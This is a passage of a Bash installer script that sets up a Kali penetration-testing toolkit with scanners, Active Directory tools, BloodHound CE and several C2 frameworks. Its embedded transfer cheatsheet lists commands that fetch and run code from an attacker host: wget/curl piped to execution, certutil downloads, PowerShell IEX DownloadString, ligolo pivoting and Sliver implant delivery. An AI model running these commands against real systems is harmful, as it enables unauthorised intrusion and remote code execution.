        if [[ "${DRY_RUN}" -eq 1 ]]; then info "would cargo install ${crate}"; continue; fi
        flag=""; [[ "${FORCE}" -eq 1 ]] && flag="--force"
        info "cargo install ${crate} (may take a few minutes; errors → log)"
        if run_as_user "'${REAL_HOME}/.cargo/bin/cargo' install ${flag} '${crate}' >>'${LOG_FILE:-/dev/null}' 2>&1"; then
            ${SUDO} ln -sf "${cargo_bin_path}" "/usr/local/bin/${bin}" 2>/dev/null || true
            ok "${crate}"; ((INSTALLED++))
        else
            warn "${crate} (cargo install failed — trying prebuilt binary fallback)"
            _rust_binary_fallback_for "${crate}" "${bin}"
        fi
    done
}

_rust_binary_fallback_for() {
    local crate="$1" bin="$2"
    case "${crate}" in
        rusthound-ce)
            local tag ver tmp_dir
            tag="$(gh_tag g0h4n RustHound-CE)"; ver="${tag#v}"
            [[ -z "${tag}" ]] && { err "rusthound-ce (no release tag for fallback)"; FAILED_ITEMS+=("rusthound-ce"); ((FAILED++)); return; }
            tmp_dir="$(mktemp -d)"
            local url="https://github.com/g0h4n/RustHound-CE/releases/download/${tag}/rusthound-ce-Linux-gnu-x86_64.tar.gz"
            local sha_url="${url}.sha256"
            local tmp_tgz="${tmp_dir}/rh.tgz"
            if ! curl -fsSL --retry 3 --connect-timeout 25 "${GH_HDR[@]}" -o "${tmp_tgz}" "${url}" 2>/dev/null; then
                err "rusthound-ce (binary fallback download failed)"; FAILED_ITEMS+=("rusthound-ce"); ((FAILED++)); rm -rf "${tmp_dir}"; return
            fi
            # verify sha256 sidecar if reachable
            local sha_tmp="${tmp_dir}/rh.sha256"
            if curl -fsSL --connect-timeout 10 "${GH_HDR[@]}" -o "${sha_tmp}" "${sha_url}" 2>/dev/null; then
                local exp act; exp="$(awk '{print $1}' "${sha_tmp}")"; act="$(sha256sum "${tmp_tgz}" | awk '{print $1}')"
                if [[ "${exp}" != "${act}" ]]; then
                    err "rusthound-ce binary fallback: SHA256 MISMATCH (expected ${exp} got ${act})"
                    FAILED_ITEMS+=("rusthound-ce"); ((FAILED++)); rm -rf "${tmp_dir}"; return
                fi
                ok "rusthound-ce sha256 verified"
            else
                warn "rusthound-ce sha256 sidecar not reachable — proceeding unverified"
            fi
            local dest="/usr/local/bin/rusthound-ce"
            if tar -xzf "${tmp_tgz}" -C "${tmp_dir}" rusthound-ce 2>/dev/null && \
               ${SUDO} mv -f "${tmp_dir}/rusthound-ce" "${dest}" && ${SUDO} chmod +x "${dest}"; then
                ok "rusthound-ce (prebuilt binary -> ${dest})"; ((INSTALLED++))
            else
                err "rusthound-ce (binary fallback extract failed)"; FAILED_ITEMS+=("rusthound-ce"); ((FAILED++))
            fi
            rm -rf "${tmp_dir}" ;;
        *)
            err "${crate} (no prebuilt fallback defined)"; FAILED_ITEMS+=("${crate}"); ((FAILED++)) ;;
    esac
}

_rust_binary_fallbacks() {
    local entry
    for entry in "${CARGO_TOOLS[@]}"; do
        _rust_binary_fallback_for "${entry%%|*}" "${entry##*|}"
    done
}

install_bloodhound_ce() {
    section "BloodHound Community Edition (docker-compose)"
    local bh_dir="${OPT_DIR}/BloodHoundCE"
    local compose_url="https://raw.githubusercontent.com/SpecterOps/BloodHound/main/examples/docker-compose/docker-compose.yml"
    local compose_file="${bh_dir}/docker-compose.yml"

    if [[ "${DRY_RUN}" -eq 1 ]]; then
        info "would download BloodHound CE docker-compose.yml -> ${bh_dir}/docker-compose.yml"
        return
    fi

    # docker is required
    if ! have docker; then
        err "BloodHound CE requires docker — install docker first (--apt), then re-run --bhce"
        FAILED_ITEMS+=("bloodhound-ce"); ((FAILED++)); return
    fi

    mkdir -p "${bh_dir}"
    if [[ -f "${compose_file}" ]] && [[ "${FORCE}" -ne 1 ]]; then
        skip "BloodHound CE docker-compose.yml (exists at ${bh_dir})"
        ((SKIPPED++))
    else
        if curl -fsSL --retry 3 --connect-timeout 20 -o "${compose_file}" "${compose_url}"; then
            ${SUDO} chown "${REAL_USER}":"${REAL_USER}" "${compose_file}" 2>/dev/null || true
            ok "BloodHound CE docker-compose.yml -> ${bh_dir}"; ((INSTALLED++))
        else
            err "BloodHound CE (docker-compose.yml download failed)"
            FAILED_ITEMS+=("bloodhound-ce"); ((FAILED++)); return
        fi
    fi

    # write a helper launcher script
    local launcher="${bh_dir}/start-bhce.sh"
    if [[ ! -f "${launcher}" ]] || [[ "${FORCE}" -eq 1 ]]; then
        cat >"${launcher}" <<'LAUNCHER'
#!/usr/bin/env bash
# BloodHound CE launcher — run from the BloodHoundCE directory
set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "${SCRIPT_DIR}"
if ! docker info >/dev/null 2>&1; then
    echo "[!] Docker isn't running. Start it: sudo systemctl start docker"; exit 1
fi
echo "[*] Starting BloodHound CE stack (first run pulls images, may take a few minutes)..."
docker compose up -d
echo "[+] BloodHound CE is up."
echo "    Web UI:        http://127.0.0.1:8080/ui/login"
echo "    Find the initial admin password with:"
echo "      docker compose logs bloodhound 2>&1 | grep 'Initial Password Set To:'"
echo
echo "    RustHound-CE ingestor:"
echo "      rusthound-ce -d DOMAIN.LOCAL -u USER@DOMAIN.LOCAL -p PASS -z"
echo "    bloodhound-python:"
echo "      bloodhound-python -d DOMAIN.LOCAL -u USER -p PASS -c All --zip"
LAUNCHER
        chmod +x "${launcher}"
        ${SUDO} chown "${REAL_USER}":"${REAL_USER}" "${launcher}" 2>/dev/null || true
        ok "BloodHound CE launcher -> ${launcher}"
    fi
    ${SUDO} chown -R "${REAL_USER}":"${REAL_USER}" "${bh_dir}" 2>/dev/null || true
    note_manual "BloodHound CE: cd ${bh_dir} && ./start-bhce.sh  (or: docker compose up -d)"
    note_manual "BloodHound CE initial admin password: docker compose logs bloodhound 2>&1 | grep 'Initial Password'"
}

install_metapackage() {
    section "Kali metapackage: kali-linux-large (large download)"
    if [[ "${DRY_RUN}" -eq 1 ]]; then info "would apt install kali-linux-large"; return; fi
    ${SUDO} apt-get update -qq || true
    if apt_install kali-linux-large; then ok "kali-linux-large"; ((INSTALLED++))
    else err "kali-linux-large (failed)"; FAILED_ITEMS+=("apt:kali-linux-large"); ((FAILED++)); fi
}

apt_fallbacks() {
    # release-binary fallbacks for packages Kali may not ship
    local t
    for t in "${APT_FALLBACK_CHECK[@]}"; do
        have "${t}" && continue
        case "${t}" in
            rustscan)
                info "rustscan not via apt — trying release .deb"
                local tag ver tmp; tag="$(gh_tag RustScan RustScan)"; ver="${tag#v}"
                tmp="$(mktemp --suffix=.deb)"
                if [[ -n "${ver}" ]] && curl -fsSL -o "${tmp}" \
                     "https://github.com/RustScan/RustScan/releases/download/${tag}/rustscan_${ver}_amd64.deb" 2>/dev/null \
                     && ${SUDO} dpkg -i "${tmp}" >/dev/null 2>&1; then
                    ${SUDO} apt-get -f install -y -qq >/dev/null 2>&1 || true
                    ok "rustscan (release .deb)"; ((INSTALLED++))
                else
                    err "rustscan (apt + release both failed)"; FAILED_ITEMS+=("rustscan"); ((FAILED++))
                fi
                rm -f "${tmp}" ;;
            gophish)
                [[ -x "${OPT_DIR}/gophish/gophish" ]] && continue
                info "gophish not via apt — trying release zip"
                local tag tmp gdir="${OPT_DIR}/gophish"; tag="$(gh_tag gophish gophish)"
                tmp="$(mktemp --suffix=.zip)"; mkdir -p "${gdir}"
                if [[ -n "${tag}" ]] && curl -fsSL -o "${tmp}" \
                     "https://github.com/gophish/gophish/releases/download/${tag}/gophish-${tag}-linux-64bit.zip" 2>/dev/null \
                     && unzip -o -q "${tmp}" -d "${gdir}" 2>/dev/null; then
                    chmod +x "${gdir}/gophish" 2>/dev/null || true
                    ${SUDO} ln -sf "${gdir}/gophish" /usr/local/bin/gophish 2>/dev/null || true
                    ok "gophish (release -> ${gdir})"; ((INSTALLED++))
                    note_manual "gophish: edit ${gdir}/config.json (bind admin to 127.0.0.1) before running."
                else
                    err "gophish (apt + release both failed)"; FAILED_ITEMS+=("gophish"); ((FAILED++))
                fi
                rm -f "${tmp}" ;;
            ligolo-mp)
                info "ligolo-mp not via apt — fetching server + client binaries"
                local mdir="${OPT_DIR}/ligolo-mp"; mkdir -p "${mdir}"
                stage "${mdir}" "latest|ttpreport/ligolo-mp|ligolo-mp_linux_amd64|ligolo-mp|"
                stage "${mdir}" "latest|ttpreport/ligolo-mp|ligolo-mp_client_linux_amd64|ligolo-mp-client|"
                [[ -x "${mdir}/ligolo-mp" ]]        && ${SUDO} ln -sf "${mdir}/ligolo-mp" /usr/local/bin/ligolo-mp 2>/dev/null || true
                [[ -x "${mdir}/ligolo-mp-client" ]] && ${SUDO} ln -sf "${mdir}/ligolo-mp-client" /usr/local/bin/ligolo-mp-client 2>/dev/null || true
                ${SUDO} chown -R "${REAL_USER}":"${REAL_USER}" "${mdir}" 2>/dev/null || true ;;
        esac
    done
}

install_apt() {
    section "APT packages (${#APT_PKGS[@]})"
    if [[ "${DRY_RUN}" -eq 1 ]]; then
        info "would apt-get install: ${APT_PKGS[*]}"
        info "would run release fallbacks for: ${APT_FALLBACK_CHECK[*]}"
        return
    fi
    if ! apt_prepare; then
        warn "Skipping apt packages this run. Fix apt, then re-run:  ${SCRIPT_NAME} --apt"
        note_manual "APT unreachable — 0 apt packages installed. Fix connectivity/clock/sources (see log), then re-run --apt."
        apt_fallbacks    # pure-GitHub binary fallbacks still work without apt
        return
    fi
    local p attempted=0 failed_here=0
    for p in "${APT_PKGS[@]}"; do
        if dpkg -s "${p}" >/dev/null 2>&1; then skip "${p}"; ((SKIPPED++)); continue; fi
        ((attempted++))
        if apt_install "${p}"; then ok "${p}"; ((INSTALLED++))
        else warn "${p} (not in apt / failed — see log)"; FAILED_ITEMS+=("apt:${p}"); ((FAILED++)); ((failed_here++)); fi
    done
    if (( attempted > 0 && failed_here * 2 >= attempted )); then
        warn "${failed_here}/${attempted} apt installs failed — apt may be partly broken or names differ on this Kali build. Check the log; try 'sudo apt update' manually."
    fi
    apt_fallbacks
    # docker: add the real user to the docker group (re-login required)
    if have docker; then
        ${SUDO} usermod -aG docker "${REAL_USER}" 2>/dev/null || true
        note_manual "docker: log out/in (or 'newgrp docker') so ${REAL_USER} can run docker without sudo."
    fi
    note_manual "BloodHound: legacy uses neo4j ('sudo neo4j console'); for BloodHound CE use the docker-compose stack."
    note_manual "ligolo-mp: 'sudo ligolo-mp' for singleplayer; agents are GENERATED in-console (agent generate --os <os> --server <IP:11601>), not staged as files."
}

install_pipx() {
    section "pipx apps (${#PIPX_PKGS[@]})"
    if ! run_as_user "command -v pipx" >/dev/null 2>&1; then
        warn "pipx missing — installing via apt"
        [[ "${DRY_RUN}" -eq 1 ]] || ${SUDO} apt-get install -y -qq pipx >/dev/null 2>&1
    fi
    [[ "${DRY_RUN}" -eq 1 ]] || run_as_user "pipx ensurepath >/dev/null 2>&1" || true
    local entry spec bin flag
    for entry in "${PIPX_PKGS[@]}"; do
        spec="${entry%%::*}"; bin="${entry##*::}"
        if run_as_user "command -v ${bin}" >/dev/null 2>&1 && [[ "${FORCE}" -ne 1 ]]; then
            skip "${spec} (${bin})"; ((SKIPPED++)); continue
        fi
        if [[ "${DRY_RUN}" -eq 1 ]]; then info "would pipx install ${spec}"; continue; fi
        flag=""; [[ "${FORCE}" -eq 1 ]] && flag="--force"
        if run_as_user "pipx install ${flag} ${spec} >>'${LOG_FILE:-/dev/null}' 2>&1"; then ok "${spec}"; ((INSTALLED++))
        else err "${spec} (pipx failed — see log)"; FAILED_ITEMS+=("pipx:${spec}"); ((FAILED++)); fi
    done
}

install_go() {
    section "Go tools (${#GO_TOOLS[@]})"
    if ! have go; then
        warn "go missing — installing golang-go"
        [[ "${DRY_RUN}" -eq 1 ]] || ${SUDO} apt-get install -y -qq golang-go >/dev/null 2>&1
    fi
    # preflight: several tools (gitleaks, amass) need a modern toolchain; Kali's
    # golang-go can lag. Warn clearly so a version failure isn't a mystery.
    if have go && [[ "${DRY_RUN}" -ne 1 ]]; then
        local gv; gv="$(go version 2>/dev/null | grep -oP 'go\K[0-9]+\.[0-9]+' | head -n1)"
        if [[ -n "${gv}" ]]; then
            local maj="${gv%%.*}" min="${gv#*.}"
            if (( maj < 1 || (maj == 1 && min < 21) )); then
                warn "Go ${gv} is old; gitleaks/amass may fail to build. Newer Go: https://go.dev/dl (untar to /usr/local/go, add /usr/local/go/bin to PATH)."
                note_manual "Go ${gv} is too old for some tools — install a current Go from go.dev/dl and re-run --go."
            fi
        fi
    fi
    [[ "${DRY_RUN}" -eq 1 ]] || ensure_go_path
    local entry bin module
    for entry in "${GO_TOOLS[@]}"; do
        bin="${entry%%|*}"; module="${entry##*|}"
        if { [[ -x "${GO_BIN}/${bin}" || -x "/usr/local/bin/${bin}" ]]; } && [[ "${FORCE}" -ne 1 ]]; then
            skip "${bin}"; ((SKIPPED++)); continue
        fi
        if [[ "${DRY_RUN}" -eq 1 ]]; then info "would go install ${module}"; continue; fi
        if run_as_user "GOBIN='${GO_BIN}' go install ${module} >>'${LOG_FILE:-/dev/null}' 2>&1"; then
            ${SUDO} ln -sf "${GO_BIN}/${bin}" "/usr/local/bin/${bin}" 2>/dev/null || true
            ok "${bin}"; ((INSTALLED++))
        else err "${bin} (go install failed — see log)"; FAILED_ITEMS+=("go:${bin}"); ((FAILED++)); fi
    done
    note_manual "nuclei: run 'nuclei -update-templates' before first use."
}

clone_repo() {  # url dest [--recursive]
    local url="$1" dest="$2" rec="${3:-}"
    if [[ -d "${dest}/.git" ]]; then
        if [[ "${FORCE}" -eq 1 && "${DRY_RUN}" -ne 1 ]]; then
            ( cd "${dest}" && git pull --ff-only -q ) && ok "$(basename "${dest}") (pulled)" || warn "$(basename "${dest}") (pull failed)"
        else skip "$(basename "${dest}") (cloned)"; ((SKIPPED++)); fi
        return 0
    fi
    if [[ "${DRY_RUN}" -eq 1 ]]; then info "would git clone ${url}"; return 0; fi
    if git clone --depth 1 ${rec} -q "${url}" "${dest}"; then ok "$(basename "${dest}")"; ((INSTALLED++))
    else err "$(basename "${dest}") (clone failed)"; FAILED_ITEMS+=("git:$(basename "${dest}")"); ((FAILED++)); fi
}

install_git() {
    section "Git repos -> ${OPT_DIR} (${#GIT_REPOS[@]})"
    local entry url name
    for entry in "${GIT_REPOS[@]}"; do
        url="${entry%%|*}"; name="${entry##*|}"
        clone_repo "${url}" "${OPT_DIR}/${name}"
    done
    # emit manual build notes for repos that need compilation
    local note_entry tool note
    for note_entry in "${BUILD_GIT_NOTES[@]}"; do
        tool="${note_entry%%|*}"; note="${note_entry##*|}"
        note_manual "${tool}: ${note}"
    done
}

install_release_bins() {
    section "Release binaries -> ${OPT_DIR} (${#RELEASE_BINS[@]})"
    local spec name bindir
    for spec in "${RELEASE_BINS[@]}"; do
        name="$(spec_name "${spec}")"
        bindir="${OPT_DIR}/${name}"
        mkdir -p "${bindir}"
        stage "${bindir}" "${spec}"
        # symlink into PATH if it landed
        if [[ "${DRY_RUN}" -ne 1 && -x "${bindir}/${name}" ]]; then
            ${SUDO} ln -sf "${bindir}/${name}" "/usr/local/bin/${name}" 2>/dev/null || true
        fi
    done
    [[ "${DRY_RUN}" -eq 1 ]] || ${SUDO} chown -R "${REAL_USER}":"${REAL_USER}" "${OPT_DIR}" 2>/dev/null || true
    note_manual "osmedeus: first run 'osmedeus health' to init config; aquatone: pipe hosts via 'cat hosts.txt | aquatone'."
}

install_c2() {
    section "C2 frameworks (apt-first, with fallback)"
    # 1) apt-first for Kali-packaged C2
    if [[ "${DRY_RUN}" -eq 1 ]]; then
        info "would apt install: ${APT_C2[*]}  (fallback: Sliver binary, Empire git)"
    else
        local p
        for p in "${APT_C2[@]}"; do
            if dpkg -s "${p}" >/dev/null 2>&1; then skip "${p} (apt)"; ((SKIPPED++))
            elif apt_install "${p}"; then ok "${p} (apt)"; ((INSTALLED++))
            else warn "${p} (not in apt — fallback if available)"; fi
        done
    fi

    # 2) Sliver fallback: prebuilt binaries
    if ! have sliver && [[ ! -x "${OPT_DIR}/sliver/sliver-server" ]]; then
        local sdir="${OPT_DIR}/sliver" e
        mkdir -p "${sdir}"
        for e in "${C2_BINARIES[@]}"; do stage "${sdir}" "${e}"; done
        if [[ "${DRY_RUN}" -ne 1 ]]; then
            [[ -x "${sdir}/sliver-server" ]] && ${SUDO} ln -sf "${sdir}/sliver-server" /usr/local/bin/sliver-server 2>/dev/null || true
            [[ -x "${sdir}/sliver-client" ]] && ${SUDO} ln -sf "${sdir}/sliver-client" /usr/local/bin/sliver 2>/dev/null || true
            ${SUDO} chown -R "${REAL_USER}":"${REAL_USER}" "${sdir}" 2>/dev/null || true
        fi
    else
        skip "sliver (present)"; ((SKIPPED++))
    fi
    note_manual "Sliver: run 'sliver-server' once to init; 'sliver' is the client."

    # 3) Empire fallback: git if apt didn't provide it
    if ! have powershell-empire && [[ ! -d "${OPT_DIR}/Empire/.git" ]]; then
        clone_repo "${EMPIRE_URL}" "${OPT_DIR}/Empire" "--recursive"
        note_manual "Empire: ./ps-empire install (or ./setup/install.sh) in ${OPT_DIR}/Empire"
    fi

    # 4) Always-git C2 (no apt/binary): Havoc / Villain / Mythic
    local url name mnote
    for e in "${C2_GIT[@]}"; do
        IFS='|' read -r url name mnote <<<"${e}"
        clone_repo "${url}" "${OPT_DIR}/${name}"
        [[ -n "${mnote}" ]] && note_manual "${name}: ${mnote}"
    done

    if [[ "${DRY_RUN}" -ne 1 ]] && have docker; then
        ${SUDO} usermod -aG docker "${REAL_USER}" 2>/dev/null || true
    fi
}

write_cheatsheet() {
    [[ "${DRY_RUN}" -eq 1 ]] && return
    local f="${TRANSFER_DIR}/TRANSFER_CHEATSHEET.md"
    cat >"${f}" <<'EOF'
# Transfer cheatsheet

Set your box IP once:

    export LHOST=$(ip -4 -o addr show tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
    [ -z "$LHOST" ] && export LHOST=$(hostname -I | awk '{print $1}')
    echo "$LHOST"

## Serve ~/tools

    cd ~/tools && python3 -m http.server 80          # simple
    cd ~/tools && updog -p 8000                       # nicer, upload support
    impacket-smbserver share ~/tools -smb2support     # SMB (\\LHOST\share)

## Pull onto Linux

    wget http://$LHOST/linux/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh
    curl http://$LHOST/linux/pspy64 -o /tmp/p && chmod +x /tmp/p && /tmp/p
    curl http://$LHOST/linux/linux-exploit-suggester.sh | sh

## Pull onto Windows

    certutil -urlcache -split -f http://%LHOST%/windows/winPEASx64.exe wp.exe & wp.exe
    powershell -c "iwr http://$env:LHOST/windows/ligolo-agent-windows-amd64.exe -o agent.exe"
    powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://$env:LHOST/windows/PowerView.ps1')"

## Ligolo-ng (proxy on your box)

    sudo ip tuntap add user $(whoami) mode tun ligolo
    sudo ip link set ligolo up
    ~/tools/pivot/ligolo-proxy-linux-amd64 -selfcert -laddr 0.0.0.0:11601
    # target:  agent -connect $LHOST:11601 -ignore-cert
    # proxy:   session  ->  then:  sudo ip route add <SUBNET>/24 dev ligolo

## Sliver (C2)

    sliver-server            # first run generates configs
    # generate --mtls $LHOST --save /tmp  ->  deliver implant  ->  use <session>
EOF
    ${SUDO} chown "${REAL_USER}":"${REAL_USER}" "${f}" 2>/dev/null || true
    ok "cheatsheet -> ${f}"
}

stage_transfer() {
    [[ ${DO_LINUX} -eq 1 ]] && { section "Transfer -> linux";   stage_group "${TRANSFER_DIR}/linux"   TRANSFER_LINUX; }
    [[ ${DO_WIN}   -eq 1 ]] && { section "Transfer -> windows"; stage_group "${TRANSFER_DIR}/windows" TRANSFER_WINDOWS; }
    [[ ${DO_PIVOT} -eq 1 ]] && { section "Transfer -> pivot";   stage_group "${TRANSFER_DIR}/pivot"   TRANSFER_PIVOT; }
    write_cheatsheet
    ${SUDO} chown -R "${REAL_USER}":"${REAL_USER}" "${TRANSFER_DIR}" 2>/dev/null || true
    note_manual "mimikatz/SharpHound/Rubeus/Snaffler may be flagged by AV on Kali — exclude ${TRANSFER_DIR}/windows if needed."
}

# ============================================================ list / health ====
resolve_url() {  # print the final download URL for a transfer/binary spec
    local spec="$1" method src asset out member url tag ver
    IFS='|' read -r method src asset out member <<<"${spec}"
    case "${method}" in
        raw)    url="${src}" ;;
        latest) url="https://github.com/${src}/releases/latest/download/${asset}" ;;
        versioned)
            tag="$(gh_tag "${src%%/*}" "${src##*/}")"; [[ -z "${tag}" ]] && return 1
            ver="${tag#v}"; asset="${asset//\{V\}/${ver}}"; asset="${asset//\{TAG\}/${tag}}"
            url="https://github.com/${src}/releases/download/${tag}/${asset}" ;;
        *) return 1 ;;
    esac
    printf '%s' "${url}"
}

check_urls() {
    section "URL validation — resolves + probes every release/raw asset"
    info "catches renamed assets / moved repos before an engagement (no install)"
    local group spec name url code bad=0 tot=0
    for group in TRANSFER_LINUX TRANSFER_WINDOWS TRANSFER_PIVOT C2_BINARIES; do
        section "${group}"
        local -n arr="${group}"
        for spec in "${arr[@]}"; do
            ((tot++)); name="$(spec_name "${spec}")"; url="$(resolve_url "${spec}")"
            if [[ -z "${url}" ]]; then err "${name} (unresolved tag/repo)"; ((bad++)); continue; fi
            # ranged 1-byte GET: works through GitHub's asset-CDN redirects and HEAD-averse hosts
            code="$(curl -fsSL -o /dev/null -w '%{http_code}' -r 0-0 --connect-timeout 20 "${GH_HDR[@]}" "${url}" 2>/dev/null)"
            case "${code}" in
                200|206|302) ok "${name}  [${code}]" ;;
                *) err "${name}  [${code:-000}]  ${url}"; ((bad++)) ;;
            esac
        done
    done
    section "URL check summary"
    if (( bad == 0 )); then ok "all ${tot} assets reachable"
    else warn "${bad}/${tot} assets FAILED — update the catalog entry or grab manually"; fi
}

install_configure() {
    # Post-install automation — runs idempotently after the main install phases.
    section "Post-install configuration"
    local did=0

    # msfdb init (Metasploit database)
    if have msfdb && ! msfdb status 2>/dev/null | grep -q 'connected\|running'; then
        if [[ "${DRY_RUN}" -eq 1 ]]; then info "would: msfdb init"
        else info "initialising Metasploit DB (msfdb init)..."
             ${SUDO} msfdb init >>"${LOG_FILE:-/dev/null}" 2>&1 && ok "msfdb init" || warn "msfdb init failed (see log)"
             ((did++))
        fi
    else skip "msfdb (already initialised or msfdb not found)"; fi

    # nuclei template update
    if have nuclei; then
        if [[ "${DRY_RUN}" -eq 1 ]]; then info "would: nuclei -update-templates"
        else info "updating nuclei templates..."
             run_as_user "nuclei -update-templates >>'${LOG_FILE:-/dev/null}' 2>&1" && ok "nuclei templates updated" || warn "nuclei template update failed"
             ((did++))
        fi
    fi

    # rockyou wordlist unzip
    local rw="/usr/share/wordlists/rockyou.txt.gz" rwtxt="/usr/share/wordlists/rockyou.txt"
    if [[ -f "${rw}" && ! -f "${rwtxt}" ]]; then
        if [[ "${DRY_RUN}" -eq 1 ]]; then info "would: gunzip ${rw}"
        else ${SUDO} gunzip "${rw}" && ok "rockyou.txt extracted" || warn "rockyou gunzip failed"
             ((did++))
        fi
    else skip "rockyou.txt (already extracted or not present)"; fi

    # docker group add (idempotent)
    if have docker && ! id -nG "${REAL_USER}" 2>/dev/null | grep -qw docker; then
        if [[ "${DRY_RUN}" -eq 1 ]]; then info "would: usermod -aG docker ${REAL_USER}"
        else ${SUDO} usermod -aG docker "${REAL_USER}" 2>/dev/null && ok "added ${REAL_USER} to docker group (re-login to take effect)" || true
             ((did++))
        fi
    fi

    # verify Go PATH in .bashrc
    [[ "${DRY_RUN}" -eq 1 ]] || ensure_go_path && ensure_cargo_path

    # BloodHound CE — just remind
    if [[ -f "${OPT_DIR}/BloodHoundCE/docker-compose.yml" ]]; then
        note_manual "BloodHound CE ready: cd ${OPT_DIR}/BloodHoundCE && ./start-bhce.sh"
    fi

    [[ ${did} -eq 0 ]] && skip "nothing to configure (everything already set)"
}

# engagement profiles ─────────────────────────────────────────────────────────
# Each profile sets DO_* vars so the user only needs one flag per engagement type.
# run: ./kali-arsenal.sh --profile recon  (or ad / web / full)
#
# ┌────────────┬──────────────────────────────────────────────────────────────┐
# │ recon      │ External recon, no AD/C2, no transfer binaries               │
# │ web        │ Web app testing: scanners, fuzzers, JS tools, CMS, secrets   │
# │ ad         │ Internal AD: all AD tools, C2, BloodHound CE, Windows bins   │
# │ full       │ Everything (same as --all)                                   │
# └────────────┴──────────────────────────────────────────────────────────────┘
apply_profile() {
    local profile="$1"
    case "${profile}" in
        recon)
            DO_APT=1; DO_PIPX=1; DO_GO=1
            info "Profile: recon (apt + pipx + go — external recon tooling)"
            ;;
        web)
            DO_APT=1; DO_PIPX=1; DO_GO=1; DO_GIT=1; DO_LINUX=1
            info "Profile: web (recon + web exploitation tools + Linux transfer binaries)"
            ;;
        ad)
            DO_APT=1; DO_PIPX=1; DO_GO=1; DO_RUST=1; DO_GIT=1
            DO_C2=1; DO_BHCE=1; DO_LINUX=1; DO_WIN=1; DO_PIVOT=1
            info "Profile: ad (full internal AD + C2 + BloodHound CE + all transfer binaries)"
            ;;
        full)
            DO_APT=1; DO_PIPX=1; DO_GO=1; DO_RUST=1; DO_GIT=1
            DO_C2=1; DO_BHCE=1; DO_LINUX=1; DO_WIN=1; DO_PIVOT=1
            info "Profile: full (same as --all)"
            ;;
        *)
            err "Unknown profile '${profile}'. Available: recon web ad full"
            exit 2
            ;;
    esac
}

do_list() {
    printf '%sInstall targets%s\n' "${C_BOLD}" "${C_RST}"
    section "APT (${#APT_PKGS[@]})";   printf '  %s\n' "${APT_PKGS[*]}"
    section "APT fallbacks";           printf '  %s\n' "${APT_FALLBACK_CHECK[*]}"
    section "pipx (${#PIPX_PKGS[@]})"; printf '  %s\n' "${PIPX_PKGS[@]%%::*}"
    section "go (${#GO_TOOLS[@]})";    printf '  %s\n' "${GO_TOOLS[@]%%|*}"
    section "cargo (${#CARGO_TOOLS[@]})"; printf '  %s\n' "${CARGO_TOOLS[@]%%|*}"
    section "release-bins (${#RELEASE_BINS[@]})"; for e in "${RELEASE_BINS[@]}"; do echo "  $(spec_name "$e")"; done
    section "git -> ${OPT_DIR}";       printf '  %s\n' "${GIT_REPOS[@]##*|}"
    section "C2 (apt-first)";          printf '  %s\n' "${APT_C2[*]}"; printf '  fallback: sliver(bin) empire(git) havoc villain mythic\n'
    section "BloodHound CE";           printf '  docker-compose -> %s/BloodHoundCE  (--bhce)\n' "${OPT_DIR}"
    # shellcheck disable=SC2088  # literal label text, not a path to expand
    section "~/tools/linux";   for e in "${TRANSFER_LINUX[@]}";   do echo "  $(spec_name "$e")"; done
    # shellcheck disable=SC2088
    section "~/tools/windows"; for e in "${TRANSFER_WINDOWS[@]}"; do echo "  $(spec_name "$e")"; done
    # shellcheck disable=SC2088
    section "~/tools/pivot";   for e in "${TRANSFER_PIVOT[@]}";   do echo "  $(spec_name "$e")"; done
    section "optional"; echo "  --metapackage  ->  kali-linux-large"
}

check_cmd()  { if have "$1"; then ok "$1"; else err "$1 (missing)"; fi; }
check_user() { if run_as_user "command -v $1" >/dev/null 2>&1; then ok "$1"; else err "$1 (missing)"; fi; }
check_bin()  { if [[ -x "${GO_BIN}/$1" || -x "/usr/local/bin/$1" ]] || have "$1"; then ok "$1"; else err "$1 (missing)"; fi; }

do_health() {
    section "Core box tools"
    local t
    for t in nmap rustscan ffuf feroxbuster sqlmap hydra hashcat john msfconsole \
             smbclient evil-winrm responder proxychains4 impacket-secretsdump xfreerdp \
             neo4j gophish iodine dnscat2 docker ligolo-mp; do check_cmd "${t}"; done
    section "pipx"
    for t in nxc certipy bloodyAD mitm6 bloodhound-python pypykatz lsassy donpapi \
              ldeep pwncat-cs trevorspray roadrecon autorecon commix xsstrike s3scanner \
              sublist3r knockpy xsrfprobe cmsmap updog; do
        check_user "${t}"
    done
    section "go"
    for t in nuclei subfinder httpx naabu katana kerbrute amass dalfox gitleaks \
              tlsx asnmap uncover interactsh-client cvemap qsreplace subjs; do
        check_bin "${t}"
    done
    section "cargo / rust"
    check_bin rusthound-ce
    check_bin aquatone
    check_bin osmedeus
    if [[ -x "${REAL_HOME}/.cargo/bin/cargo" ]]; then ok "cargo (rustup)"; else err "cargo (missing — run --rust)"; fi
    if [[ -d "${OPT_DIR}/BloodHoundCE" ]]; then ok "BloodHound CE (${OPT_DIR}/BloodHoundCE)"; else err "BloodHound CE (missing — run --bhce)"; fi
    section "C2"
    check_bin sliver
    if have powershell-empire || [[ -d "${OPT_DIR}/Empire/.git" ]]; then ok "Empire"; else err "Empire (missing)"; fi
    for d in Havoc Villain Mythic; do
        if [[ -d "${OPT_DIR}/${d}/.git" ]]; then ok "${d} (cloned)"; else err "${d} (missing)"; fi
    done
    section "Transfer binaries"
    local d f cnt
    for d in linux windows pivot; do
        cnt=0
        [[ -d "${TRANSFER_DIR}/${d}" ]] && while IFS= read -r f; do ((cnt++)); done < <(find "${TRANSFER_DIR}/${d}" -maxdepth 1 -type f 2>/dev/null)
        printf '  %-8s %s%d files%s in %s\n' "${d}" "${C_C}" "${cnt}" "${C_RST}" "${TRANSFER_DIR}/${d}"
    done
}

# ================================================================ summary =======
summary() {
    section "Summary"
    printf '  %sinstalled:%s %d   %sskipped:%s %d   %sfailed:%s %d\n' \
        "${C_G}" "${C_RST}" "${INSTALLED}" "${C_DIM}" "${C_RST}" "${SKIPPED}" "${C_R}" "${C_RST}" "${FAILED}"
    if ((${#FAILED_ITEMS[@]})); then
        warn "Failed (re-run --update or grab manually):"; printf '    - %s\n' "${FAILED_ITEMS[@]}"
    fi
    if ((${#MANUAL_NOTES[@]})); then section "Manual follow-ups"; printf '  * %s\n' "${MANUAL_NOTES[@]}"; fi
    [[ -n "${LOG_FILE}" ]] && info "Log: ${LOG_FILE}"
}

# ================================================================= usage ========
usage() {
    cat <<EOF
